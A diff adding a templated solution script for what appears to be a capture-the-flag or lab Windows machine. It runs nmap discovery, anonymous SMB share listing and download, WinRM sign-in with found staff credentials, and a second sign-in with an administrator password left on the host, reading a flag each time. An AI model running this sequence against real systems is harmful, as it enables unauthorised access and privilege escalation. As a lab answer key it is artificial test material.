@@ -1,0 +1,17 @@
+## find the PC and what it offers
+nmap -sn {{NET}}.0/24
+nmap -sV {{NET}}.30
+## list the shared folders as a guest, then read the one open to everyone
+smbclient -L //{{NET}}.30 -N
+smbclient //{{NET}}.30/{{SHARE}} -N -c 'ls; get {{NOTE}}'
+cat {{NOTE}}
+## sign in as the staff member and take the first flag
+winrm-shell -i {{NET}}.30 -u {{STAFF}} -p {{STAFFPW}}
+Get-Content C:\Users\{{STAFF}}\Desktop\flag.txt
+## an administrator's password was left behind on this PC
+{{LOOK}}
+exit
+## sign in again as that administrator
+winrm-shell -i {{NET}}.30 -u {{ADMUSER}} -p {{ADMPW}}
+Get-Content C:\Users\Administrator\Desktop\flag.txt
+exit
